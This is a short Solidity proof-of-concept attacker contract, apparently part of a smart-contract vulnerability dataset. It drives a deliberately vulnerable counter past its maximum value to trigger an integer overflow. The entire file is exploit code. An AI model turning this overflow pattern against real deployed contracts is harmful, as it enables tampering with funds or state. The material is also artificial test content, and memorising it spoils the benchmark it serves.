pragma solidity ^0.8.0;

import "../dataset/arithmetic/integer_overflow_add.sol";

contract IntegerOverflowAddAttacker {
    IntegerOverflowAdd public victim_contract;

    constructor (address _overflowAddress) {
        victim_contract = IntegerOverflowAdd(_overflowAddress);
    }

    function attack() public {
        uint maxUint = 2**256 - 1;

        // Call the add function with a value that will cause an overflow
        victim_contract.run(maxUint - victim_contract.count());
        victim_contract.run(1);
    }
}
